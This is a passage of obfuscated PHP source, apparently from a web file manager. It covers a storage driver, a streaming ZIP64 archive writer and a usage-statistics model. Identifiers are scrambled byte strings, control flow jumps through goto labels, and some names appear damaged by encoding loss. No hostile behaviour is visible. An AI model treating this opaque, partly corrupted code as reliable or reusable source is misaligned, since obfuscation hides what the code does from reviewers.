dáÒ¡ÅÓá‹: } public function link($DÉ›¤½Ú, $E°íÅêğ…ğ = array()) { return parent::link($DÉ›¤½Ú, $E°íÅêğ…ğ); } public function fileOut($Dî†ŞŠ¯Ã¶, $eÚ¢¾ğÌÁ = false, $AÏ·¹†ëº = false, $fóÒˆ”õ„ = '') { if (strstr($this->endpoint, $_SERVER[³‘’¼äÑ™ÔÍ][1246])) { return parent::fileOutServer($Dî†ŞŠ¯Ã¶, $eÚ¢¾ğÌÁ, $AÏ·¹†ëº, $fóÒˆ”õ„); } parent::fileOut($Dî†ŞŠ¯Ã¶, $eÚ¢¾ğÌÁ, $AÏ·¹†ëº, $fóÒˆ”õ„); } public function fileOutImage($D°Ô„…Àİ, $Eß«¶¶ñİÔ = 250) { if (strstr($this->endpoint, $_SERVER[³‘’¼äÑ™ÔÍ][1246])) { return parent::fileOutImageServer($D°Ô„…Àİ, $Eß«¶¶ñİÔ); } parent::fileOutImage($D°Ô„…Àİ, $Eß«¶¶ñİÔ); } public function fileOutLink($dÔŠáçñö‹) { $a¡œÒ·ó®´ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (substr($dÔŠáçñö‹, 0, 7) == $a¡œÒ·ó®´[1119]) { $dÔŠáçñö‹ = $a¡œÒ·ó®´[1120] . substr($dÔŠáçñö‹, 7); } header($a¡œÒ·ó®´[156] . $dÔŠáçñö‹); die; } public function getHost() { $C‰‰ÃÖŠ¬Í =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fäÒôÃƒëƒ = str_rtrim(parent::getHost(), $C‰‰ÃÖŠ¬Í[8] . $this->bucket); $fäÒôÃƒëƒ = explode($C‰‰ÃÖŠ¬Í[171], $fäÒôÃƒëƒ); return $fäÒôÃƒëƒ[0] . $C‰‰ÃÖŠ¬Í[171] . $this->bucket . $C‰‰ÃÖŠ¬Í[91] . $fäÒôÃƒëƒ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($A½áßñÅÁ´, $AØòé˜±  = 0) { parent::__construct(); $this->source = $A½áßñÅÁ´; $this->sourceSize = $AØòé˜± ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($F—‚ÔêÍĞ˜ = false) { return $this->sourceSize; } public function getContent($d‘©…ô’ìÆ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $Bë¹ìÅ¿Â = ftell($this->source); $a‹Û‡Œ › = @fread($this->source, $this->sourceSize); fseek($this->source, $Bë¹ìÅ¿Â); return $a‹Û‡Œ ›; } } public function fileSubstr($fó¨ïñ×ˆÂ = false, $d„ëŒ„³²è = 0, $E¼ĞÜ¶õ¬± = 0) { if (!$E¼ĞÜ¶õ¬±) { $E¼ĞÜ¶õ¬± = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $d„ëŒ„³²è, $E¼ĞÜ¶õ¬±); } if ($this->sourceType == self::TYPE_FILE) { $eäµŸ‡Ášõ = ftell($this->source); fseek($this->source, $eäµŸ‡Ášõ + $d„ëŒ„³²è); $bäÓ¬³˜ëğ = @fread($this->source, $E¼ĞÜ¶õ¬±); fseek($this->source, $eäµŸ‡Ášõ); return $bäÓ¬³˜ëğ; } } public function hashMd5($fİ§ã­ÕĞ˜ = false) { return md5($this->getContent()); } public static function hash($bµƒÚÁÙÎ, $DÑŞ×‚Ùïø = 0) { $FÛèò’¸Èš = new PathDriverStream($bµƒÚÁÙÎ, $DÑŞ×‚Ùïø); return $FÛèò’¸Èš->hashSimple($bµƒÚÁÙÎ); } public static function md5($fºà™Ğñ¤™, $Dê†Ç¼É‚ = 0) { $c·µ‡â‡ë = new PathDriverStream($fºà™Ğñ¤™, $Dê†Ç¼É‚); return $c·µ‡â‡ë->hashMd5($fºà™Ğñ¤™); } } goto aáù ä’ÖØ; dŒ÷À¸øŸ: class ZipMake { const VERSION = "\x30\x2e\62\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($DÄñ ¥Õ™µ = null) { $bÁÎœœ×²ƒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->outputStream = fopen($bÁÎœœ×²ƒ[2017], $bÁÎœœ×²ƒ[1232]); $this->outputName = $DÄñ ¥Õ™µ; $this->needHeaders = !0; } public function addFile($cË„°İßÆ†, $aéòÇáÕØ) { goto f¥Šïù÷ÊÜ; cï®³Ç©¶: $Eéñ÷÷©ğ = $this->addFileHeader($cË„°İßÆ†, $C—ô° ìåƒ); $BìÂÛ÷ˆ…‘ = $D’‡ùë¾² = filesize($aéòÇáÕØ); $a„ó‹šµ = fopen($aéòÇáÕØ, $b¡¾îß‹šÏ[2018]); goto AÚñ£ÖÌÌ±; AÚñ£ÖÌÌ±: while (!feof($a„ó‹šµ)) { $D¹ ±ÊãÆÔ = fread($a„ó‹šµ, 1048576); $this->send($D¹ ±ÊãÆÔ); } fclose($a„ó‹šµ); $bˆ«å…³Ã = hexdec(hash_file($b¡¾îß‹šÏ[2019], $aéòÇáÕØ)); goto BŒöé‰„–¾; f¥Šïù÷ÊÜ: $b¡¾îß‹šÏ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cË„°İßÆ† = $this->filterFilename($cË„°İßÆ†); $C—ô° ìåƒ = static::METHOD_STORE; goto cï®³Ç©¶; BŒöé‰„–¾: $this->addFileFooter($cË„°İßÆ†, $C—ô° ìåƒ, $bˆ«å…³Ã, $BìÂÛ÷ˆ…‘, $D’‡ùë¾², $Eéñ÷÷©ğ); goto eâ†Éùº¢ç; eâ†Éùº¢ç: } public function addFileFromStream($e¶ÙíÍ—™Š, $bé¬ùâä) { goto a«Ì±ì‚”ñ; cÙè Éèíæ: $a¿„‡‡Ş­” = hash_init($_SERVER[³‘’¼äÑ™ÔÍ][2019]); while (!feof($bé¬ùâä)) { $DÎéÜè¬š• = fread($bé¬ùâä, 1048576); hash_update($a¿„‡‡Ş­”, $DÎéÜè¬š•); $this->send($DÎéÜè¬š•); } $fîß‰‰ß­ƒ = hexdec(hash_final($a¿„‡‡Ş­”)); goto Eïº‚ñèÍà; Eïº‚ñèÍà: $this->addFileFooter($e¶ÙíÍ—™Š, $a¶Üˆ“¯ƒß, $fîß‰‰ß­ƒ, $b»Ô¾ğ½º„, $d½³Õé¥Ïí, $eğßŒ¯„); goto AÂŠåøß; a«Ì±ì‚”ñ: $e¶ÙíÍ—™Š = $this->filterFilename($e¶ÙíÍ—™Š); $a¶Üˆ“¯ƒß = static::METHOD_STORE; $eğßŒ¯„ = $this->addFileHeader($e¶ÙíÍ—™Š, $a¶Üˆ“¯ƒß); goto f˜¿¡‰Ÿ«‰; f˜¿¡‰Ÿ«‰: fseek($bé¬ùâä, 0, SEEK_END); $b»Ô¾ğ½º„ = $d½³Õé¥Ïí = ftell($bé¬ùâä); rewind($bé¬ùâä); goto cÙè Éèíæ; AÂŠåøß: } public function finish() { foreach ($this->files as $CÇ¸„”àÕ÷) { $this->addCdrFile($CÇ¸„”àÕ÷); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($dÁ§Ó×ÑŞ, $FƒØ…¤) { goto FÊ¡÷«àË„; Dç±¬à©¬µ: $a‚Ç¿¥ËÜ = $this->dosTime(time()); $D­²ÇîÃõº = array(array($dÛ°·§„£[2021], static::FILE_HEADER_SIGNATURE), array($dÛ°·§„£[2022], static::ZIP_VERSION_64), array($dÛ°·§„£[2022], 8), array($dÛ°·§„£[2022], $FƒØ…¤), array($dÛ°·§„£[2021], $a‚Ç¿¥ËÜ), array($dÛ°·§„£[2021], 0), array($dÛ°·§„£[2021], 4294967295), array($dÛ°·§„£[2021], 4294967295), array($dÛ°·§„£[2022], $eï‹È·ÄÃÔ), array($dÛ°·§„£[2022], 32)); $cÓ•èÃ¯Èì = array(array($dÛ°·§„£[2022], 1), array($dÛ°·§„£[2022], 28), array($dÛ°·§„£[2023], 0), array($dÛ°·§„£[2023], 0), array($dÛ°·§„£[2023], 0), array($dÛ°·§„£[2021], 0)); goto B­°Å‰Ñ½; B­°Å‰Ñ½: $C÷éá×±” = $this->packFields($D­²ÇîÃõº); $a¯Ù²ÀÃø = $this->packFields($cÓ•èÃ¯Èì); $this->send($C÷éá×±” . $dÁ§Ó×ÑŞ . $a¯Ù²ÀÃø); goto FÇæèš„æÔ; FÇæèš„æÔ: return strlen($C÷éá×±”) + $eï‹È·ÄÃÔ + strlen($a¯Ù²ÀÃø); goto Bóéñë¡±½; FÊ¡÷«àË„: $dÛ°·§„£ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dÁ§Ó×ÑŞ = preg_replace($dÛ°·§„£[2020], $dÛ°·§„£[33], $dÁ§Ó×ÑŞ); $eï‹È·ÄÃÔ = strlen($dÁ§Ó×ÑŞ); goto Dç±¬à©¬µ; Bóéñë¡±½: } protected function addFileFooter($DÂä¶ñ·»¨, $BÂæ”´¿, $b‘›ÎòŒğ, $AÔÓ÷‚™°Ì, $FÓ¤Š±ÂÌ†, $CÓìŒ¼‚‡„) { $DìÄÒñ¤ç =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F¸…ä“ïÑ = array(array($DìÄÒñ¤ç[2021], static::DATA_DESCRIPTOR_SIGNATURE), array($DìÄÒñ¤ç[2021], $b‘›ÎòŒğ), array($DìÄÒñ¤ç[2023], $AÔÓ÷‚™°Ì), array($DìÄÒñ¤ç[2023], $FÓ¤Š±ÂÌ†)); $dô¥›áÏƒ = $this->packFields($F¸…ä“ïÑ); $this->send($dô¥›áÏƒ); $dñÇƒŞ†ô = $CÓìŒ¼‚‡„ + $AÔÓ÷‚™°Ì + $F îí‹Úã; $this->addToCdr($DÂä¶ñ·»¨, $BÂæ”´¿, $b‘›ÎòŒğ, $AÔÓ÷‚™°Ì, $FÓ¤Š±ÂÌ†, $dñÇƒŞ†ô); } private function addToCdr($E—âíìõ»±, $Bß©Ü“¾Š, $B´ Ì’ˆè, $B¬ˆò±“ªÆ, $a­ÄÀå½Å¢, $bÃ”«¸‰‰) { $this->files[] = array($E—âíìõ»±, $Bß©Ü“¾Š, $B´ Ì’ˆè, $B¬ˆò±“ªÆ, $a­ÄÀå½Å¢, $this->ofs); $this->ofs += $bÃ”«¸‰‰; } protected function addCdrFile($D‰°æ¨ŒÓª) { goto aõ•Ô¹×Á¦; aõ•Ô¹×Á¦: $d—„áÑŠ” =& $_SERVER[³‘’¼äÑ™ÔÍ]; list($cÌè¿‘Ùô³, $c×Ï…Ÿ™ò‘, $CÜÙ…Öùê, $Eñ´»ô‘Ø–, $EºİŸÉÚ, $d¼„ÜÛÔ¿) = $D‰°æ¨ŒÓª; $EƒİÉÒ†É† = $d—„áÑŠ”[33]; goto AŞ´äù†ó; dÅÍÈ‹Ä¡™: $e›•ĞÏƒÖÉ = $this->packFields($dÖÍÙ…Æ¥); $b¬ó–Ÿùì† = $this->packFields($E‘îˆÒñ); $b§¸âÄ°Íª = $e›•ĞÏƒÖÉ . $cÌè¿‘Ùô³ . $EƒİÉÒ†É† . $b¬ó–Ÿùì†; goto B‘§Í¨±¹ë; AŞ´äù†ó: $bÖ¬¯òªÒ¼ = $this->dosTime(time()); $dÖÍÙ…Æ¥ = array(array($d—„áÑŠ”[2021], static::CDR_FILE_SIGNATURE), array($d—„áÑŠ”[2022], static::ZIP_VERSION_64), array($d—„áÑŠ”[2022], static::ZIP_VERSION_64), array($d—„áÑŠ”[2022], 8), array($d—„áÑŠ”[2022], $c×Ï…Ÿ™ò‘), array($d—„áÑŠ”[2021], $bÖ¬¯òªÒ¼), array($d—„áÑŠ”[2021], $CÜÙ…Öùê), array($d—„áÑŠ”[2021], 4294967295), array($d—„áÑŠ”[2021], 4294967295), array($d—„áÑŠ”[2022], strlen($cÌè¿‘Ùô³)), array($d—„áÑŠ”[2022], 32), array($d—„áÑŠ”[2022], strlen($EƒİÉÒ†É†)), array($d—„áÑŠ”[2022], 0), array($d—„áÑŠ”[2022], 0), array($d—„áÑŠ”[2021], 32), array($d—„áÑŠ”[2021], 4294967295)); $E‘îˆÒñ = array(array($d—„áÑŠ”[2022], 1), array($d—„áÑŠ”[2022], 28), array($d—„áÑŠ”[2023], $EºİŸÉÚ), array($d—„áÑŠ”[2023], $Eñ´»ô‘Ø–), array($d—„áÑŠ”[2023], $d¼„ÜÛÔ¿), array($d—„áÑŠ”[2021], 0)); goto dÅÍÈ‹Ä¡™; B‘§Í¨±¹ë: $this->send($b§¸âÄ°Íª); $this->cdr_ofs += strlen($b§¸âÄ°Íª); goto f…Ó«Í¨ö±; f…Ó«Í¨ö±: } protected function addCdr64Eof() { goto A¿˜°ªóç; E§¥¤¢«ïƒ: $bö„‚‡©Š¯ = $this->ofs; $Aƒô®İî° = array(array($Dò’á“ôÂÉ[2021], static::ZIP64_CDR_EOF_SIGNATURE), array($Dò’á“ôÂÉ[2023], 44), array($Dò’á“ôÂÉ[2022], static::ZIP_VERSION_64), array($Dò’á“ôÂÉ[2022], static::ZIP_VERSION_64), array($Dò’á“ôÂÉ[2021], 0), array($Dò’á“ôÂÉ[2021], 0), array($Dò’á“ôÂÉ[2023], $d²¢Óµœ¬â), array($Dò’á“ôÂÉ[2023], $d²¢Óµœ¬â), array($Dò’á“ôÂÉ[2023], $f‘Æ±ˆÔŒ„), array($Dò’á“ôÂÉ[2023], $bö„‚‡©Š¯)); $AŞÎø±–‘Ë = $this->packFields($Aƒô®İî°); goto A“³›ëˆ’ï; A¿˜°ªóç: $Dò’á“ôÂÉ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d²¢Óµœ¬â = count($this->files); $f‘Æ±ˆÔŒ„ = $this->cdr_ofs; goto E§¥¤¢«ïƒ; A“³›ëˆ’ï: $this->send($AŞÎø±–‘Ë); goto CµßƒªÊ©ó; CµßƒªÊ©ó: } protected function addCdr64Locator() { goto AÔÁ©™; dŒÙ¡ˆéÃ: $AÁñøÀŞ¨ù = $this->ofs; $F¾æª‚ò‡‚ = array(array($bÖ¥á²˜¿¬[2021], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($bÖ¥á²˜¿¬[2021], 0), array($bÖ¥á²˜¿¬[2023], $AÁñøÀŞ¨ù + $bÇÍ²²ìë), array($bÖ¥á²˜¿¬[2021], 1)); $A›¶„œ‡ï‹ = $this->packFields($F¾æª‚ò‡‚); goto Aê¢İòÔÁ; Aê¢İòÔÁ: $this->send($A›¶„œ‡ï‹); goto cñ¬İçîÎ£; AÔÁ©™: $bÖ¥á²˜¿¬ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B–…Ù Õ‘ = count($this->files); $bÇÍ²²ìë = $this->cdr_ofs; goto dŒÙ¡ˆéÃ; cñ¬İçîÎ£: } protected function addCdrEof() { goto aç¤òÌÍÖ®; C²…Ó•ƒï‚: $A©„œ¬èÖô = $this->packFields($F³ä‘Ñ¿) . $B­”¤ò‹ÊÑ; $this->send($A©„œ¬èÖô); goto bÌçÑÓèÌÒ; CøŸ˜ö¯ø¦: $aøÃ¸øóš = $this->ofs; $B­”¤ò‹ÊÑ = $d› é¬ÌÏ[33]; $F³ä‘Ñ¿ = array(array($d› é¬ÌÏ[2021], static::CDR_EOF_SIGNATURE), array($d› é¬ÌÏ[2022], 0), array($d› é¬ÌÏ[2022], 0), array($d› é¬ÌÏ[2022], $AôÊ¨Õ‰‡ê), array($d› é¬ÌÏ[2022], $AôÊ¨Õ‰‡ê), array($d› é¬ÌÏ[2021], 4294967295), array($d› é¬ÌÏ[2021], 4294967295), array($d› é¬ÌÏ[2022], strlen($B­”¤ò‹ÊÑ))); goto C²…Ó•ƒï‚; aç¤òÌÍÖ®: $d› é¬ÌÏ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AôÊ¨Õ‰‡ê = count($this->files); $E‡òøÔªòø = $this->cdr_ofs; goto CøŸ˜ö¯ø¦; bÌçÑÓèÌÒ: } protected function addCdr() { foreach ($this->files as $B…í´íÜ ¦) { $this->addCdrFile($B…í´íÜ ¦); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $B“—“èò… =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c•Ì±¢ÆÉÍ = $B“—“èò…[202]; if ($this->outputName) { $A˜‚­×Ó = trim(str_replace(array($B“—“èò…[113], $B“—“èò…[55], $B“—“èò…[93], $B“—“èò…[67], $B“—“èò…[217], $B“—“èò…[996]), $B“—“èò…[33], $this->outputName)); $b«Ş™êòæ‚ = rawurlencode($A˜‚­×Ó); $c•Ì±¢ÆÉÍ .= "\73\40\146\x69\154\x65\156\x61\x6d\145\x2a\x3d\165\164\146\55\70\x27\x27{$b«Ş™êòæ‚}"; } $fÙ½ˆ´¬É‹ = array($B“—“èò…[199] => $B“—“èò…[2024], $B“—“èò…[2025] => $c•Ì±¢ÆÉÍ, $B“—“èò…[2026] => $B“—“èò…[2027], $B“—“èò…[2028] => $B“—“èò…[2029], $B“—“èò…[2030] => $B“—“èò…[2031]); foreach ($fÙ½ˆ´¬É‹ as $c²ğÉ‰õ˜¶ => $D¶¡µ«Ïª¸) { header($c²ğÉ‰õ˜¶ . $B“—“èò…[884] . $D¶¡µ«Ïª¸); } } protected function send($D®ˆÚÚ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $D®ˆÚÚ); } protected final function dosTime($a±¹÷îÑ‡‘) { $ešàÄï™Çé =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d¿£¾¾ïãÒ = getdate($a±¹÷îÑ‡‘); if ($d¿£¾¾ïãÒ[$ešàÄï™Çé[1734]] < 1980) { $d¿£¾¾ïãÒ = array($ešàÄï™Çé[1734] => 1980, $ešàÄï™Çé[2032] => 1, $ešàÄï™Çé[2033] => 1, $ešàÄï™Çé[2034] => 0, $ešàÄï™Çé[2035] => 0, $ešàÄï™Çé[2036] => 0); } $d¿£¾¾ïãÒ[$ešàÄï™Çé[1734]] -= 1980; return $d¿£¾¾ïãÒ[$ešàÄï™Çé[1734]] << 25 | $d¿£¾¾ïãÒ[$ešàÄï™Çé[2032]] << 21 | $d¿£¾¾ïãÒ[$ešàÄï™Çé[2033]] << 16 | $d¿£¾¾ïãÒ[$ešàÄï™Çé[2034]] << 11 | $d¿£¾¾ïãÒ[$ešàÄï™Çé[2035]] << 5 | $d¿£¾¾ïãÒ[$ešàÄï™Çé[2036]] >> 1; } protected function packFields($Bğ²ïáä‘œ) { $F‡ôˆÛÚÛ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F’Öç¿¾„‚ = $F‡ôˆÛÚÛ[33]; $fã„ºÎœìƒ = array(); foreach ($Bğ²ïáä‘œ as $BÛÖ„Ì›) { $F’Öç¿¾„‚ .= $BÛÖ„Ì›[0]; $fã„ºÎœìƒ[] = $BÛÖ„Ì›[1]; } array_unshift($fã„ºÎœìƒ, $F’Öç¿¾„‚); return call_user_func_array($F‡ôˆÛÚÛ[2037], $fã„ºÎœìƒ); } protected function filterFilename($EŒÜ»õ¡’“) { $C¸Ä×ÜÈ‹§ =& $_SERVER[³‘’¼äÑ™ÔÍ]; return str_replace(array($C¸Ä×ÜÈ‹§[93], $C¸Ä×ÜÈ‹§[4], $C¸Ä×ÜÈ‹§[176], $C¸Ä×ÜÈ‹§[69], $C¸Ä×ÜÈ‹§[113], $C¸Ä×ÜÈ‹§[929], $C¸Ä×ÜÈ‹§[932], $C¸Ä×ÜÈ‹§[271]), $C¸Ä×ÜÈ‹§[70], $EŒÜ»õ¡’“); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($Dê ²¡ØŞ») { $fÔ¿»Íè¤Ã =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aÀ§¯”Š†Ï = array($fÔ¿»Íè¤Ã[535] => array($fÔ¿»Íè¤Ã[29] => $fÔ¿»Íè¤Ã[2038], $fÔ¿»Íè¤Ã[261] => array($fÔ¿»Íè¤Ã[210], $fÔ¿»Íè¤Ã[703], $fÔ¿»Íè¤Ã[2039], $fÔ¿»Íè¤Ã[2040])), $fÔ¿»Íè¤Ã[2041] => array($fÔ¿»Íè¤Ã[29] => $fÔ¿»Íè¤Ã[2042], $fÔ¿»Íè¤Ã[261] => array($fÔ¿»Íè¤Ã[210], $fÔ¿»Íè¤Ã[701], $fÔ¿»Íè¤Ã[2043], $fÔ¿»Íè¤Ã[2044], $fÔ¿»Íè¤Ã[2045]))); if (!isset($aÀ§¯”Š†Ï[$Dê ²¡ØŞ»])) { return !1; } $this->optionType = $aÀ§¯”Š†Ï[$Dê ²¡ØŞ»][$fÔ¿»Íè¤Ã[29]]; $this->field = $aÀ§¯”Š†Ï[$Dê ²¡ØŞ»][$fÔ¿»Íè¤Ã[261]]; return !0; } public function listData($aÕâï¢¡ˆ = false, $D¯¶é»‹¯­ = "\x6d\x6f\x64\151\x66\171\124\x69\155\145", $a°Ä¾£é’Ô = false) { return parent::listData($aÕâï¢¡ˆ, $D¯¶é»‹¯­, $a°Ä¾£é’Ô); } public function trendList($B½œ½ÆØÓ) { goto EØ¶¶è„³; EØ¶¶è„³: $D½È µ±š® =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eíİÁ½Ù»æ = $this->listData(); if ($eíİÁ½Ù»æ) { $c§‚ôÏË¯ = end($eíİÁ½Ù»æ); $A³Õ‘ŠÙí = date($D½È µ±š®[2046], strtotime($D½È µ±š®[2047])); if ($c§‚ôÏË¯[$D½È µ±š®[210]] == $A³Õ‘ŠÙí) { return $eíİÁ½Ù»æ; } $BÅ²ßŠ‘’ = strtotime($c§‚ôÏË¯[$D½È µ±š®[210]]); } goto E“Í¯ØîÄ; F£ºèİ¡š: foreach ($a…«Ä³Úƒ‚ as $A³Õ‘ŠÙí) { $this->{$fŞÜÆñ¸Íê}($A³Õ‘ŠÙí); } return $this->listData(); goto cŒª÷´™è; E“Í¯ØîÄ: if (!isset($BÅ²ßŠ‘’)) { $EîÂÒêøæô = $B½œ½ÆØÓ == $D½È µ±š®[535] ? $D½È µ±š®[477] : $D½È µ±š®[756]; $BÅ²ßŠ‘’ = Model($EîÂÒêøæô)->min($D½È µ±š®[187]); } $fŞÜÆñ¸Íê = $D½È µ±š®[2048] . ucfirst($B½œ½ÆØÓ); $a…«Ä³Úƒ‚ = $this->dateList($BÅ²ßŠ‘’); goto F£ºèİ¡š; cŒª÷´™è: } private function dateList($AìØàŞ–õÈ) { $F‘§†•¨Á» =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bçŞ×ç¡Î” = $AìØàŞ–õÈ; $aïëÚííò§ = strtotime($F‘§†•¨Á»[2047]); $fÊ·¡‰­® = array(); while ($bçŞ×ç¡Î” <= $aïëÚííò§) { $fÊ·¡‰­®[] = date($F‘§†•¨Á»[2046], $bçŞ×ç¡Î”); $bçŞ×ç¡Î” = strtotime($F‘§†•¨Á»[2049], $bçŞ×ç¡Î”); } return $fÊ·¡‰­®; } public function _recordUser($cªŠª§ŸØ‡ = '') { goto b’ìÙ÷ß«ê; b’ìÙ÷ß«ê: $FÑŒêˆô =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B‰ê÷´÷Ú = strtotime(date($FÑŒêˆô[2050], strtotime($cªŠª§ŸØ‡))); $b‹å§†ÈØµ = strtotime(date($FÑŒêˆô[2051], strtotime($cªŠª§ŸØ‡))); goto aíŒÚÊŒõõ; aíŒÚÊŒõõ: $f‚Æ•áêªˆ = array($FÑŒêˆô[187] => array($FÑŒêˆô[931], $b‹å§†ÈØµ)); $B™ÏÈÕ†Ğ = Model($FÑŒêˆô[477])->where($f‚Æ•áêªˆ)->count($FÑŒêˆô[1445]); $f‚Æ•áêªˆ[$FÑŒêˆô[187]] = array($FÑŒêˆô[321], array($B‰ê÷´÷Ú, $b‹å§†ÈØµ)); goto A´‡©‹ÚÛÏ; A´‡©‹ÚÛÏ: $e‹¯³›ˆŠ½ = Model($FÑŒêˆô[477])->where($f‚Æ•áêªˆ)->count($FÑŒêˆô[1445]); $f‚Æ•áêªˆ[$FÑŒêˆô[29]] = $FÑŒêˆô[2052]; $DÙØ±›ÇÎğ = Model($FÑŒêˆô[2053])->where($f‚Æ•áêªˆ)->count($FÑŒêˆô[2054]); goto FÛ’ƒ·ĞÍß; FÛ’ƒ·ĞÍß: $A¯Úİˆì = array($FÑŒêˆô[210] => $cªŠª§ŸØ‡, $FÑŒêˆô[703] => (int) $B™ÏÈÕ†Ğ, $FÑŒêˆô[2039] => (int) $e‹¯³›ˆŠ½, $FÑŒêˆô[2040] => (int) $DÙØ±›ÇÎğ); return $this->insert($A¯Úİˆì); goto A„†ïªàÌ; A„†ïªàÌ: } public function _recordStore($CŞã·§Ó‘¦ = '') { goto fôƒõíİ—¡; E«¨¦–¥Ã˜: $CÆ©†ÚåÁÈ = Model($EÀô§¾Î¨§[422])->where($fÛ±í–Ìå¤)->sum($EÀô§¾Î¨§[77]); $fÛ±í–Ìå¤[$EÀô§¾Î¨§[370]] = 0; $EÀ„®ùÏˆ = Model($EÀô§¾Î¨§[756])->where($fÛ±í–Ìå¤)->sum($EÀô§¾Î¨§[77]); goto dø›ˆÜÂÀ†; Cñì–¡ˆè¡: $cİ—êÜ¢Ÿ = Model($EÀô§¾Î¨§[756])->where($fÛ±í–Ìå¤)->sum($EÀô§¾Î¨§[77]); $BÈç®ËÔ¢ = array($EÀô§¾Î¨§[210] => $CŞã·§Ó‘¦, $EÀô§¾Î¨§[701] => (int) $EÀ„®ùÏˆ, $EÀô§¾Î¨§[2043] => (int) $CÆ©†ÚåÁÈ, $EÀô§¾Î¨§[2044] => (int) $b×”ƒ‚×¢ª, $EÀô§¾Î¨§[2045] => (int) $cİ—êÜ¢Ÿ); return $this->insert($BÈç®ËÔ¢); goto E‹µ®ÜÉ‡; fôƒõíİ—¡: $EÀô§¾Î¨§ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D‚¨Ç·Ö¬¤ = strtotime(date($EÀô§¾Î¨§[2051], strtotime($CŞã·§Ó‘¦))); $fÛ±í–Ìå¤ = array($EÀô§¾Î¨§[187] => array($EÀô§¾Î¨§[931], $D‚¨Ç·Ö¬¤)); goto E«¨¦–¥Ã˜; dø›ˆÜÂÀ†: $fÛ±í–Ìå¤[$EÀô§¾Î¨§[371]] = 1; $b×”ƒ‚×¢ª = Model($EÀô§¾Î¨§[756])->where($fÛ±í–Ìå¤)->sum($EÀô§¾Î¨§[77]); $fÛ±í–Ìå¤[$EÀô§¾Î¨§[371]] = 2; goto Cñì–¡ˆè¡; E‹µ®ÜÉ‡: } public function trend($Cğ¾Šñ™±½, $f¢Şª‘ê·ê) { goto BÖßá’Šô; d©Ë÷ïÓÆ: if ($CÏŞ“øİ„´ && $f¢Şª‘ê·ê != $A¿Šñ´ª”ù[1420]) { $c¹äŠ©‘‚÷ = $CÏŞ“øİ„´[0][$A¿Šñ´ª”ù[210]]; $e×¬Êğ„… = $this->validDate($f¢Şª‘ê·ê, $c¹äŠ©‘‚÷); $c„½íŒë±« = array(); $f‚ÄŠó¡à = array_to_keyvalue($CÏŞ“øİ„´, $A¿Šñ´ª”ù[210]); foreach ($e×¬Êğ„… as $CöÛŠÑ…‰) { if (isset($f‚ÄŠó¡à[$CöÛŠÑ…‰])) { $Fè£öˆÒ¦£ = $f‚ÄŠó¡à[$CöÛŠÑ…‰]; } else { $Fè£öˆÒ¦£ = end($CÏŞ“øİ„´); $Fè£öˆÒ¦£[$A¿Šñ´ª”ù[210]] = $CöÛŠÑ…‰; if ($Cğ¾Šñ™±½ == $A¿Šñ´ª”ù[535]) { $Fè£öˆÒ¦£[$A¿Šñ´ª”ù[2039]] = $Fè£öˆÒ¦£[$A¿Šñ´ª”ù[2040]] = 0; } } $c„½íŒë±«[] = $Fè£öˆÒ¦£; } $CÏŞ“øİ„´ = $c„½íŒë±«; } $EÕ³¹­¦œª = array($A¿Šñ´ª”ù[535] => array($A¿Šñ´ª”ù[703] => LNG($A¿Šñ´ª”ù[2055]), $A¿Šñ´ª”ù[2039] => LNG($A¿Šñ´ª”ù[2056]), $A¿Šñ´ª”ù[2040] => LNG($A¿Šñ´ª”ù[2057])), $A¿Šñ´ª”ù[2041] => array($A¿Šñ´ª”ù[701] => LNG($A¿Šñ´ª”ù[2058]), $A¿Šñ´ª”ù[2043] => LNG($A¿Šñ´ª”ù[2059]), $A¿Šñ´ª”ù[2044] => LNG($A¿Šñ´ª”ù[2060]), $A¿Šñ´ª”ù[2045] => LNG($A¿Šñ´ª”ù[2061]))); $A°Û”è÷Ş = array($A¿Šñ´ª”ù[535] => $A¿Šñ´ª”ù[2062], $A¿Šñ´ª”ù[2041] => $A¿Šñ´ª”ù[77]); goto Fƒï­£•ƒÁ; aæÀ»¡¨ï: return $b³ŸˆåšâÇ; goto Bï¸«ÚÑãÑ; Fƒï­£•ƒÁ: if (empty($CÏŞ“øİ„´)) { $CöÛŠÑ…‰ = date($A¿Šñ´ª”ù[2046], strtotime($A¿Šñ´ª”ù[2047])); $A„–Â¸Ø‹Ê = array($A¿Šñ´ª”ù[210] => $CöÛŠÑ…‰); foreach 